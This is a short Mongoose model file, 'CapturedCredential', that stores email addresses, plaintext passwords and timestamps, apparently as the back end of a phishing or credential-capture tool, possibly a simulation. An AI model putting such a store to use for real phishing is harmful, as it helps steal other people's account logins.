// models/CapturedCredential.js
const mongoose = require("mongoose");

const capturedCredentialSchema = new mongoose.Schema({
  email: String,
  password: String,
  timestamp: {
    type: Date,
    default: Date.now,
  },
});

module.exports = mongoose.model("CapturedCredential", capturedCredentialSchema);
